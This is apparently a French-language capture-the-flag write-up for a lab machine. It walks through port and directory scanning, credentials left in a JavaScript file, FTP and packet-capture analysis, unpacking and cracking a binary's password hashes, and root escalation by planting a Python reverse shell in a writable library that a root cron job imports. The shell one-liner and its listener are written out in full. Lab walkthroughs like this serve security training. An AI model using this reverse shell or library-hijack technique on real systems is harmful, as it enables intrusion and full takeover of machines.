## TAGS : #WEB #PRIVESC #RE 

nmap 10.10.79.170
* SSH open
* HTTP open

Scan gobuster :
```
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/gallery              (Status: 301) [Size: 314] [--> http://10.10.79.170/gallery/]
/pricing              (Status: 301) [Size: 314] [--> http://10.10.79.170/pricing/]
/server-status        (Status: 403) [Size: 277]
/static               (Status: 301) [Size: 313] [--> http://10.10.79.170/static/]

```

Crawl sur static :
```
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/00                   (Status: 200) [Size: 127]
/3                    (Status: 200) [Size: 421858]
/11                   (Status: 200) [Size: 627909]
/5                    (Status: 200) [Size: 1426557]
/6                    (Status: 200) [Size: 2115495]
/10                   (Status: 200) [Size: 2275927]
/12                   (Status: 200) [Size: 2203486]
/15                   (Status: 200) [Size: 3477315]
/9                    (Status: 200) [Size: 1190575]
/1                    (Status: 200) [Size: 2473315]
/13                   (Status: 200) [Size: 3673497]
/14                   (Status: 200) [Size: 3838999]
/2                    (Status: 200) [Size: 3627113]
/7                    (Status: 200) [Size: 5217844]
/4                    (Status: 200) [Size: 7389635]
/8                    (Status: 200) [Size: 7919631]
```
L'id de la première image est 1, donc 00 = suspect 
![[Pasted image 20240307192513.png]]

----------------------------------------------------------------------------------------------------------------------------------
On se rend sur http://10.10.79.170/dev1243224123123/
On vérifie les codes sources 
![[Pasted image 20240307192545.png]]

----------------------------------------------------------------------------------------------------------------------------------
On trouve les identifiants sur le fichier dev.js 
username === "siemDev" && password === "california"
![[Pasted image 20240307192822.png]]


![[Pasted image 20240307192947.png]]
Un port non commun est mentionné pour le protocole FTP, je relance un scan sur les 65535
`nmap -p- 10.10.79.170`
La commande nous retourne une nouvelle entrée : 
37370/tcp open  unknown

----------------------------------------------------------------------------------------------------------------------------------
On essaye de se connecter en ftp en utilisant le même mot de passe car "stop reusing credentials" est mentioné dans la devnote 
ftp -p -P 37370 10.10.79.170
Name : siemDev
Pass : california
Contenu du serveur FTP : 
* siemFTP.pcapng
* siemHTTP1.pcapng 
* siemHTTP2.pcapng 

#### siemFTP.pcapng
login => anonymous:anonymous

#### siemHTTP1.pcapng
rien ?

#### siemHTTP2.pcapng
File > export objects > HTTP 
On save tout et on vérifie, celui qui nous parait le plus évident c'est les fichiers provenant de l'IP locale, qui ont l'air de former un site web
![[Pasted image 20240307195446.png]]

Sur les index, on trouve deux pages de connexion qui ne mènent à rien et une page qui contient des identifiants : 
Il ne s'agit pas d'identifiants sur la page vue précedemment car compte unique été écrit en clair dans le code source, j'en déduis qu'il s'agit du compte pour se connecter en SSH.
![[Pasted image 20240307200537.png]]

  # <strong><font style="color:red"  font size=6px>🔴🎯<u>FLAG 1 </u>🔴🎯 </font></strong> 
![[Pasted image 20240307200712.png]]

----------------------------------------------------------------------------------------------------------------------------------
On trouve un executable dans le dossier home "valleyAuthenticator"
aide sur internet il faut utiliser UPX  

Utilisation d'upx pour unpack l'executable : 
`upx -d valleyAuthenticator`
On peut maintenant l'executer mais il nous faut des identifiants : 
![[Pasted image 20240307204847.png]]

----------------------------------------------------------------------------------------------------------------------------------
On utilise `strings valleyAuthenticator > valleyAuthenticatorOut` puis on l'ouvre avec nano, on recherche "username", on trouve deux hash qu'on va save dans un autre fichier. On utilise par la suite john the ripper pour récup les mots de passes : 
valley:liberty123
![[Pasted image 20240307205936.png]]
![[Pasted image 20240307211024.png]]
On se connecte ensuite avec `su valley`

----------------------------------------------------------------------------------------------------------------------------------
On vérifie les cronjobs avec cat /etc/crontab et on constate un script python qui s'execute toutes les minutes :

![[Pasted image 20240307211845.png]]
![[Pasted image 20240307211859.png]]

----------------------------------------------------------------------------------------------------------------------------------
Le script importe une librairie base64, on cherche celle-ci : 
`locate base64 | grep -iF "/base64.py"`
![[Pasted image 20240307212315.png]]

Résumé :
On sais que le script **photosEncrypt** se lance en droits root toutes les minutes
On ne peut **pas** modifier le script python
Le script utilise une librairie sur laquelle on peut écrire 
On peut donc mettre un **reverse shell** sur la librairie ( **base64.py** ) pour que lors de l'importation de celle-ci par la tache **photosEncrypt.py**, le **revshell** se lance avec les même droits que **photosEncrypt.py**

Sur la victime : 
* nano /usr/lib/python3.8/base64.py 
	* (revshells.com) : `import os,pty,socket;s=socket.socket();s.connect(("10.8.97.183",8544));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")`
Sur l'attaquant : 
* nc -lvnp 8544

![[Pasted image 20240307213419.png]]

Flag user = user.txt 
Déduction :
* flag root = root.txt
* Donc : 
	* find / -type f -name "flag"

  # <strong><font style="color:red"  font size=6px>🔴🎯<u>FLAG 2</u>🔴🎯 </font></strong> 
![[Pasted image 20240307213953.png]]